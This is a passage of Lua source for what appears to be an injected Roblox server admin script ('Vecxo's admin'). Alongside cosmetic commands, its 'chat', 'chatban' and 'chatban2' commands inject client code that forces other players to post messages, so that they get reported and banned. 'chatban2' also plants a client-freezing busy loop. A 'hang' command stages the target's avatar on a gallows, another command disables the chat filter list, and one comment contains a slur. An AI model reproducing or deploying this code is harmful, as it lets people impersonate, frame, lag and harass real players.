				if v.Name == "Handle" then
					v:Destroy()
				end
				if v:IsA("Decal") then
					v:Destroy()
				end
			end

			local mesh = Instance.new("BlockMesh", plr.Character.HumanoidRootPart)
			mesh.Scale = Vector3.new(3, 3, 0.1)
			mesh.Name = "PNG"

			local decal = Instance.new("Decal", plr.Character.HumanoidRootPart)
			decal.Face = "Back"
			decal.Name = "image"

			local decalf = Instance.new("Decal", plr.Character.HumanoidRootPart)
			decalf.Face = "Front"
			decalf.Name = "image"

			if id == "" or id == " " or id == nil then
				id = "15637324487"
			end

			if id:lower() == "cat" then
				id = cats[math.random(1, #cats)]
			end

			local st, result = pcall(game:GetService("InsertService").LoadAsset, game:GetService("InsertService"), id)
			if st then -- Getz the textureid of the decal
				image = result:FindFirstChildWhichIsA("Decal", true)
				if image then
					decal.Texture = image.Texture
					decalf.Texture = image.Texture
				end
			else -- already has the texture id so we can just dew it
				decal.Texture = "rbxassetid://".. id
				decalf.Texture = "rbxassetid://".. id
			end
		end
	end
})

addcmd({
	Name = "skybox",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local id = arguments[1]
		local sky

		if not game.Lighting:FindFirstChildOfClass("Sky") then
			sky = Instance.new("Sky", game.Lighting)
		else
			sky = game.Lighting:FindFirstChildOfClass("Sky")
		end

		if id == "" or id == " " or id == nil then
			id = "15637324487"
		end

		if id:lower() == "cat" then
			id = cats[math.random(1, #cats)]
		end

		local st, result = pcall(game:GetService("InsertService").LoadAsset, game:GetService("InsertService"), id)
		if st then -- Getz the textureid of the decal
			image = result:FindFirstChildWhichIsA("Decal", true)
			if image then
				sky.SkyboxBk = image.Texture
				sky.SkyboxDn = image.Texture
				sky.SkyboxFt = image.Texture
				sky.SkyboxLf = image.Texture
				sky.SkyboxRt = image.Texture
				sky.SkyboxUp = image.Texture
			end
		else -- already has the texture id so we can just dew it
			sky.SkyboxBk = "rbxassetid://".. id
			sky.SkyboxDn = "rbxassetid://".. id
			sky.SkyboxFt = "rbxassetid://".. id
			sky.SkyboxLf = "rbxassetid://".. id
			sky.SkyboxRt = "rbxassetid://".. id
			sky.SkyboxUp = "rbxassetid://".. id
		end
	end
})

addcmd({
	Name = "decalspam",
	Aliases = {"decal"},
	Player = false,
	Function = function(sender, targets, arguments)
		local id = arguments[1]

		if id == "" or id == " " or id == nil then
			id = "15637324487"
		end

		if id:lower() == "cat" then
			id = cats[math.random(1, #cats)]
		end

		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Decal") then
				v:Destroy()
			end
		end

		local st, result = pcall(game:GetService("InsertService").LoadAsset, game:GetService("InsertService"), id)
		if st then -- Getz the textureid of the decal
			image = result:FindFirstChildWhichIsA("Decal", true)
			if image then
				for i, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") then
						for i, f in ipairs(Enum.NormalId:GetEnumItems()) do
							if not v:FindFirstChildWhichIsA("Decal") or v:FindFirstChildWhichIsA("Decal").Face ~= f then
								local decal = Instance.new("Decal")
								decal.Texture = image.Texture
								decal.Face = f
								decal.Parent = v
							end
						end
					end
				end
			end
		else -- already has the texture id so we can just dew it
			for i, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					for i, f in ipairs(Enum.NormalId:GetEnumItems()) do
						if not v:FindFirstChildWhichIsA("Decal") or v:FindFirstChildWhichIsA("Decal").Face ~= f then
							local decal = Instance.new("Decal")
							decal.Texture = "rbxassetid://".. id
							decal.Face = f
							decal.Parent = v
						end
					end
				end
			end
		end
	end
})

addcmd({
	Name = "removeobby",
	Aliases = {"hideobby"},
	Player = false,
	Function = function(sender, targets, arguments)
		for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v.Name == "Snow" or v.Name == "Jumps" then
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild(v.Name) then
					v:Destroy()
				else
					v.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
				end
			end
		end
	end
})

addcmd({
	Name = "obby",
	Aliases = {"unhideobby"},
	Player = false,
	Function = function(sender, targets, arguments)
		for i, v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):GetChildren()) do
			if v.Name == "Snow" or v.Name == "Jumps" then
				v.Parent = game:GetService("Workspace"):FindFirstChild("Tabby"):FindFirstChild("Admin_House")
			end
		end
	end
})

addcmd({
	Name = "muter",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local torf = arguments[1]

		if torf ~= "true" and torf ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."tag true")
		end

		local bool = (torf == "true")

		muter = bool
	end
})

addcmd({
	Name = "nok",
	Aliases = {"nobbykill"},
	Player = false,
	Function = function(sender, targets, arguments)
		game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
	end
})

addcmd({
	Name = "ok",
	Aliases = {"obbykill"},
	Player = false,
	Function = function(sender, targets, arguments)
		game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
	end
})

addcmd({
	Name = "re",
	Aliases = {"reset"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local rnpos = plr.Character:FindFirstChild("HumanoidRootPart").CFrame

				for i,v in pairs(plr.Character:GetChildren()) do
					if v:IsA("Accessory") or v:IsA("Unknown") then
						local currentcf = v.Handle.CFrame
						c = v:Clone()
						c.Parent = workspace
						c.Handle.CanCollide = true
						c.Handle.CFrame = currentcf
					end
				end

				for i, limb in pairs(plr.Character:GetChildren()) do
					if limb:IsA("BasePart") then
						limb:Destroy()
					end
				end

				plr:LoadCharacter()
				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = rnpos

			else
				plr:LoadCharacter()
			end
		end
	end
})

addcmd({
	Name = "respawn",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			plr:LoadCharacter()
		end
	end
})

addcmd({
	Name = "exit",
	Aliases = {"leave"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local s = Instance.new("Sound", plr.Character)

			s.SoundId = "rbxassetid://1289263994"
			s.Volume = 10
			s:Play()

			for i,v in pairs(plr.Character:GetChildren()) do
				if v:IsA("Accessory") or v:IsA("Unknown") then
					local currentcf = v.Handle.CFrame
					v:Clone().Parent = workspace
					v.Handle.CFrame = currentcf
				end
			end

			for i, limb in pairs(plr.Character:GetChildren()) do
				if limb:IsA("BasePart") then
					limb:Destroy()
				end
			end

			plr:Kick("[EXITED] by cxo's admin.")
		end
	end
})

addcmd({
	Name = "unload",
	Aliases = {"closescript"},
	Player = false,
	Function = function(sender, targets, arguments)
		local h = Instance.new("Hint", workspace)
		for i = 5, 1, -1 do
			h.Text = "Vecxo's admin | Unloading in ".. i .." seconds"
			task.wait(1)
		end
		h:Destroy()
		for i,v in pairs(cxoconnections) do
			if typeof(v) ~= "function" then
				v:Disconnect()
			end
			cxoconnections[i] = nil
		end
		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder") then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):Destroy()
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("Vecxo's admin GUI") then
					v.PlayerGui:FindFirstChild("Vecxo's admin GUI"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("Synapse X") then
					v.PlayerGui:FindFirstChild("Synapse X"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("Command Bar") then
					v.PlayerGui:FindFirstChild("Command Bar"):Destroy()
				end
			end
		end
		TempWhitelist = {}
		cxoconnections = {}
		_G.Whitelist = {}
		_G.cxosadminloaded = false
	end
})

addcmd({
	Name = "clr",
	Aliases = {"clrbuilds"},
	Player = false,
	Function = function(sender, targets, arguments)
		_G.btoolsparts = {}
		for i,v in pairs(workspace:GetChildren()) do
			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
				v:Destroy()
			end
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name ~= "face" and v:IsA("Decal") or v:IsA("ParticleEmitter") then
				v:Destroy()
			end
		end
	end
})

addcmd({
	Name = "hang",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then

				local floor = Instance.new("Part", workspace)
				floor.Name = "cxo was here"
				floor.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -2.5 , 0)
				floor.Material = Enum.Material.Wood
				floor.BrickColor = BrickColor.new("Rust")
				floor.Size = Vector3.new(16, 1, 16)
				floor.Anchored = true

				local pole = Instance.new("Part", workspace)
				pole.Name = "cxo was here"
				pole.CFrame = floor.CFrame * CFrame.new(0, 6.5, 7)
				pole.Material = Enum.Material.Wood
				pole.BrickColor = BrickColor.new("Rust")
				pole.Size = Vector3.new(2, 12, 2)
				pole.Anchored = true

				local pole2 = Instance.new("Part", workspace)
				pole2.Name = "cxo was here"
				pole2.CFrame = pole.CFrame * CFrame.new(0, 6.5, -2)
				pole2.Material = Enum.Material.Wood
				pole2.BrickColor = BrickColor.new("Rust")
				pole2.Size = Vector3.new(2, 1, 6)
				pole2.Anchored = true

				local metal = Instance.new("Part", workspace)
				metal.Name = "cxo was here"
				metal.CFrame = pole.CFrame * CFrame.new(0, 7.05, -4)
				metal.Material = Enum.Material.DiamondPlate
				metal.BrickColor = BrickColor.new("Black")
				metal.Size = Vector3.new(2, 0.1, 0.1)
				metal.Anchored = true

				local metal2 = Instance.new("Part", workspace)
				metal2.Name = "cxo was here"
				metal2.CFrame = metal.CFrame * CFrame.new(-1.05, -0.56, 0)
				metal2.Material = Enum.Material.DiamondPlate
				metal2.BrickColor = BrickColor.new("Black")
				metal2.Size = Vector3.new(0.1, 1.213, 0.1)
				metal2.Anchored = true

				local metal3 = Instance.new("Part", workspace)
				metal3.Name = "cxo was here"
				metal3.CFrame = metal.CFrame * CFrame.new(1.05, -0.56, 0)
				metal3.Material = Enum.Material.DiamondPlate
				metal3.BrickColor = BrickColor.new("Black")
				metal3.Size = Vector3.new(0.1, 1.213, 0.1)
				metal3.Anchored = true

				local metal4 = Instance.new("Part", workspace)
				metal4.Name = "cxo was here"
				metal4.CFrame = pole.CFrame * CFrame.new(0, 5.93, -4)
				metal4.Material = Enum.Material.DiamondPlate
				metal4.BrickColor = BrickColor.new("Black")
				metal4.Size = Vector3.new(2, 0.1, 0.1)
				metal4.Anchored = true

				local rope = Instance.new("Part", workspace)
				rope.Name = "cxo was here"
				rope.CFrame = metal4.CFrame * CFrame.new(0, -0.60, 0)
				rope.Material = Enum.Material.Leather
				rope.BrickColor = BrickColor.new("Burnt Sienna")
				rope.Size = Vector3.new(0.1, 1.113, 0.1)
				rope.Anchored = true

				local rope2 = Instance.new("Part", workspace)
				rope2.Name = "cxo was here"
				rope2.CFrame = rope.CFrame * CFrame.new(0, -0.6, 0)
				rope2.Material = Enum.Material.Leather
				rope2.BrickColor = BrickColor.new("Burnt Sienna")
				rope2.Size = Vector3.new(1.459, 0.1, 0.1)
				rope2.Anchored = true

				local rope3 = Instance.new("Part", workspace)
				rope3.Name = "cxo was here"
				rope3.CFrame = rope2.CFrame * CFrame.new(0.78, -0.5560, 0)
				rope3.Material = Enum.Material.Leather
				rope3.BrickColor = BrickColor.new("Burnt Sienna")
				rope3.Size = Vector3.new(0.1, 1.215, 0.1)
				rope3.Anchored = true

				local rope4 = Instance.new("Part", workspace)
				rope4.Name = "cxo was here"
				rope4.CFrame = rope2.CFrame * CFrame.new(-0.78, -0.5560, 0)
				rope4.Material = Enum.Material.Leather
				rope4.BrickColor = BrickColor.new("Burnt Sienna")
				rope4.Size = Vector3.new(0.1, 1.215, 0.1)
				rope4.Anchored = true

				local rope5 = Instance.new("Part", workspace)
				rope5.Name = "cxo was here"
				rope5.CFrame = rope.CFrame * CFrame.new(0, -1.715, 0)
				rope5.Material = Enum.Material.Leather
				rope5.BrickColor = BrickColor.new("Burnt Sienna")
				rope5.Size = Vector3.new(1.459, 0.1, 0.1)
				rope5.Anchored = true

				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1 , 0.5)
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Humanoid.Animator:Destroy()
				plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
			end
		end
	end
})

addcmd({
	Name = "serverlock",
	Aliases = {"slock"},
	Player = false,
	Function = function(sender, targets, arguments)
		if locked ~= true then
			locked = true
			local hint = Instance.new("Hint", workspace)
			hint.Text = "cxo's admin | This server is locked"
			hint.Name = "ServerLockNotification"
			notfi(sender, "Vecxo's admin", "the server has been locked.")
		end
	end
})

addcmd({
	Name = "unserverlock",
	Aliases = {"unslock"},
	Player = false,
	Function = function(sender, targets, arguments)
		if locked ~= false then
			locked = false
			if workspace:FindFirstChild("ServerLockNotification") then
				workspace.ServerLockNotification:Destroy()
			end
			notfi(sender, "Vecxo's admin", "the server has been unlocked.")
		end
	end
})

addcmd({
	Name = "model",
	Aliases = {"insertmodel"},
	Player = false,
	Function = function(sender, targets, arguments)
		local id = tonumber(arguments[1])

		if #arguments < 1 then
			notfi(sender, "Vecxo's admin", "You need to provide an ID!")
			return
		end

		local success, asset = pcall(function()
			return game:GetService("InsertService"):LoadAsset(id)
		end)

		if success then
			asset.Parent = workspace
			asset.Name = "cxo's admin inserted model"
			if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				asset:MoveTo(sender.Character:FindFirstChild("HumanoidRootPart").Position)
			end
		else
			notfi(sender, "Vecxo's admin", "Failed to insert model. The model must be owned by the ROBLOX account to be elibile to insert.")
			return
		end
	end
})

addcmd({
	Name = "f3x",
	Aliases = {"btools"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, err = pcall(function()
				require(2571067295).load(plr.Name)
			end)

			if err then
				notfi(sender, "Vecxo's admin", "F3X failed to load: ".. err)
			end

		end
	end
})
--[[
addcmd({
    Name = "chatbubbles",
    Aliases = {},
	Player = false,
    Function = function(sender, targets, arguments)
		local option = table.concat(arguments, " ", 1)

		if option ~= "true" and option ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. prefix .."chatbubbles false")
		end

		local bool = (option == "true")

		game.TextChatService.BubbleChatConfiguration.Enabled = true
    end
})

addcmd({
    Name = "chatbar",
    Aliases = {},
	Player = false,
    Function = function(sender, targets, arguments)
		local option = table.concat(arguments, " ", 1)

		if option ~= "true" and option ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. prefix .."chatbar false")
		end

		local bool = (option == "true")

		game.TextChatService.ChatInputBarConfiguration.Enabled = bool
    end
})
]]
addcmd({
	Name = "chat",
	Aliases = {},
	Function = function(sender, targets, arguments)
		--if not restrictcheck(sender) then
		local msg = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do
			if _G.sudo then
				--notfi(sender, "Vecxo's admin", "This command is currently patched!")
				_G.sudo(plr.Name, msg, "all")
			else
				if _G.say and typeof(_G.say) == "function" then
					_G.say(plr.Name, msg)
					return
				else
					_G.say = function(p, m)
						p = game.Players:FindFirstChild(p)
						if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
							local ticking = tick()
							require(112354705578311).load() -- goog readder
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
						end

						local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

						if not goog then
							warn("goog failed to be added, command can not continue")
							notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
							return
						end

						local scr = goog:FindFirstChild("Utilities").Client:Clone()
						local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = string.format([[

								game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("%s")

								script:Destroy()

							]], m)

						if p.Character then
							scr.Parent = p.Character
						else
							scr.Parent = p:WaitForChild("PlayerGui")
						end

						scr.Enabled = true
					end
					_G.say(plr.Name, msg)
				end
			end
		end
		--[[else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end]]
	end
})

addcmd({
	Name = "chatban",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			--notfi(sender, "Vecxo's admin", "This command is currently patched!")

			if plr.Name == sender.Name then
				notfi(sender, "Vecxo's admin", "Due to your account's safety you can not ban yourself!")
				return
			end

			if table.find(_G.Whitelist, tostring(plr.UserId)) or table.find(TempWhitelist, plr.UserId) then
				if sender.UserId ~= 3222470105 then
					notfi(sender, "Vecxo's admin", "You can not run this command on whitelisted users!")
					return
				end
			end

			if not _G.sudo then
				notfi(sender, "Vecxo's admin", "Critical error! _G.sudo is not found, inserting..")
				local success, fail = pcall(function()
					require(97248613655645).Run()
				end)
				task.spawn(function()
					task.wait(5)
					if not success then
						notfi(sender, "Vecxo's admin", "Failed to insert _G.sudo: " .. fail)
						return
					else
						notfi(sender, "Vecxo's admin", "_G.sudo has been inserted.", 2)
					end
				end)
			else
				local latest
				local banning = true
				for c = #chats, 1, -1 do
					if string.find(chats[c], plr.Name ..":") then
						latest = chats[c]
						break
					end
				end
				if latest then
					local remove = plr.Name .. ":"
					local banstring = latest:gsub(remove, "", 1)

					local co = coroutine.create(function()
						repeat
							task.wait(0.3)
							_G.sudo(plr.Name, banstring, "all")
						until banning == false or not game.Players:FindFirstChild(plr.Name)
					end)

					coroutine.resume(co)

					coroutine.wrap(function()
						notfi(sender, "Vecxo's admin", "Report ".. plr.Name .." for swearing to ban them!")
						task.wait(10)
						banning = false
						coroutine.yield(co)
					end)()

				else
					notfi(sender.Name, "Vecxo's admin", plr.Name .." Hasn't spoke yet! wait for them to chat then use this command.")
				end
			end
		end
	end
})

addcmd({
	Name = "chatban2",
	Aliases = {"sus"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			--notfi(sender, "Vecxo's admin", "This command is currently patched!")

			if plr.Name == sender.Name then
				notfi(sender, "Vecxo's admin", "Due to your account's safety you can not ban yourself!")
			end

			if table.find(_G.Whitelist, tostring(plr.UserId)) or table.find(TempWhitelist, plr.UserId) then
				if sender.UserId ~= 3222470105 then
					notfi(sender, "Vecxo's admin", "You can not run this command on whitelisted users!")
					return
				end
			end

			if not _G.sudo then
				notfi(sender, "Vecxo's admin", "Critical error! _G.sudo is not found, inserting..")
				local success, fail = pcall(function()
					require(97248613655645).Run()
				end)
				task.spawn(function()
					task.wait(5)
					if not success then
						notfi(sender, "Vecxo's admin", "Failed to insert _G.sudo: " .. fail)
						return
					else
						notfi(sender, "Vecxo's admin", "_G.sudo has been inserted.", 2)
					end
				end)
			else
				local latest
				local banning = true
				for c = #chats, 1, -1 do
					if string.find(chats[c], plr.Name ..":") then
						latest = chats[c]
						break
					end
				end
				if latest then
					local remove = plr.Name .. ":"
					local banstring = latest:gsub(remove, "", 1)

					local co = coroutine.create(function()
						repeat
							_G.sudo(plr.Name, banstring)
							task.wait()
						until banning == false or not game.Players:FindFirstChild(plr.Name)
					end)

					coroutine.resume(co)

					if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
						local ticking = tick()
						require(112354705578311).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

					if not goog then
						warn("goog failed to be added, command can not continue")
						notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = [[

						game:GetService("RunService").Heartbeat:Connect(function()
							local osclock = os.clock()
							while osclock + 1 / 0.5 > os.clock() do
							end
							task.wait()
							osclock = os.clock()
						end)

					]]

					if plr.Character then
						scr.Parent = plr.Character
					else
						scr.Parent = plr:WaitForChild("PlayerGui")
					end

					scr.Enabled = true

					coroutine.wrap(function()
						notfi(sender, "Vecxo's admin", "Report ".. plr.Name .." for swearing to ban them!")
						task.wait(10)
						banning = false
						coroutine.yield(co)
					end)()

				else
					notfi(sender.Name, "Vecxo's admin", plr.Name .." Hasn't spoke yet! wait for them to chat then use this command.")
				end
			end
		end
	end
})

addcmd({
	Name = "legacychat",
	Aliases = {"oldchat"},
	Player = false,
	Function = function(sender, targets, arguments)
		if not _G.sudo then
			local success, fail = pcall(function()
				require(97248613655645).Run()
				notfi(sender, "Vecxo's admin", "Inserting _G.sudo", 3)
			end)
			task.spawn(function()
				task.wait(5)
				if not success then
					notfi(sender, "Vecxo's admin", "Failed to insert _G.sudo: " .. fail)
					return
				else
					notfi(sender, "Vecxo's admin", "_G.sudo has been inserted.", 2)
				end
			end)
		end
		--game:GetService("TextChatService"):ClearAllChildren() < fag way
		game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
		game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = false
		-- ^ pro way
		--[[for i,v in pairs(game.Players:GetPlayers()) do
			if game.PrivateServerId ~= "" then
				game:GetService("TeleportService"):Teleport(game.PlaceId, v)
			else
				local options = Instance.new("TeleportOptions")
				options.ServerInstanceId = game.JobId

				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {vis}, options)
			end
			task.wait(0.10)
		end]]
		local noti = Instance.new("Hint", workspace)
		noti.Text = "cxo's admin | This server now has legacy chat. Please wait a few seconds for it to enable."
		task.spawn(function()
			task.wait(15)
			noti:Destroy()
		end)
		task.spawn(function() -- Fuck these stupid meta table s blud
			--[[rawset(_G, "badwords", nil)
			setmetatable(_G, {
				__newindex = function(t, k, v)
					if k == "badwords" then
						rawset(t, k, {})
						print("wiped the table")
					else
						rawset(t, k, v)
						print(k)
					end
				end
			})]]
			while task.wait() do
				_G.badwords = {}
			end
		end)
		_G.filtermode = true
		notfi(sender, "Vecxo's admin", "You need to load exser and use the chatbypass so people can talk!")
	end
})

--[[
addcmd({
	Name = "legacychat",
	Aliases = {"oldchat"},
	Player = false,
	Function = function(sender, targets, arguments)
		local success, fail = pcall(function()
			require(100506488790924).load("MainModule")
		end)
		
		if success then
			notfi(sender, "Vecxo's admin", "Loading!")
			_G.badwords = {}
			_G.filtermode = true
		else
			notfi(sender, "Vecxo's admin", "Failed to load Legacy Chat: ", fail)
			return
		end
	end
})]]

addcmd({
	Name = "loadsudo",
	Aliases = {"loadgsudo"},
	Player = false,
	Function = function(sender, targets, arguments)
		--notfi(sender, "Vecxo's admin", "This command is currently patched!")
		if not _G.sudo then
			local success, fail = pcall(function()
				require(97248613655645).Run()
				notfi(sender, "Vecxo's admin", "Inserting _G.sudo", 3)
			end)
			task.spawn(function()
				task.wait(5)
				if not success then
					notfi(sender, "Vecxo's admin", "Failed to insert _G.sudo: " .. fail)
					return
				else
					notfi(sender, "Vecxo's admin", "_G.sudo has been inserted.", 2)
				end
			end)
		else
			notfi(sender, "Vecxo's admin", "Sudo is already loaded!")
		end
	end
})

addcmd({
	Name = "mcdonalds",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's") then
			local mcd = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("McDonald's"):Clone()
			mcd.Parent = workspace
			mcd.PrimaryPart = mcd:FindFirstChild("Floor")
			mcd:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's") then
			local success, fail = pcall(function()
				--require(83374861646895) -- McDonald's
				require(100506488790924).load("McDonald's")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
				building.PrimaryPart = building:FindFirstChild("Floor")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
			else
				notfi(sender, "Vecxo's admin", "McDonalds failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("McDonald's"):Clone()
			building.PrimaryPart = building:FindFirstChild("Floor")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-9.5, -3, -30) * CFrame.Angles(0,math.rad(180),0))
		end
	end
})

addcmd({
	Name = "711",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11") then
			local seveneleven = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11"):Clone()
			seveneleven.Parent = workspace
			seveneleven.PrimaryPart = seveneleven:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			seveneleven:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11") then
			local success, fail = pcall(function()
				require(100506488790924).load("7-11")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
				building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
			else
				notfi(sender, "Vecxo's admin", "7-11 failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("7-11"):Clone()
			building.PrimaryPart = building:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end
	end
})

addcmd({
	Name = "kfc",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC") then
			local KFC = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC"):Clone()
			KFC.Parent = workspace
			KFC.PrimaryPart = KFC:FindFirstChild("Union")
			KFC:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC") then
			local success, fail = pcall(function()
				require(100506488790924).load("KFC")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
			else
				notfi(sender, "Vecxo's admin", "KFC failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end
	end
})

addcmd({
	Name = "burgerking",
	Aliases = {"bk"},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing") then
			local BurgerKing = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("BurgerKing"):Clone()
			BurgerKing.Parent = workspace
			BurgerKing.PrimaryPart = BurgerKing:FindFirstChild("Part")
			BurgerKing:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing") then
			local success, fail = pcall(function()
				require(100506488790924).load("BurgerKing")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing")
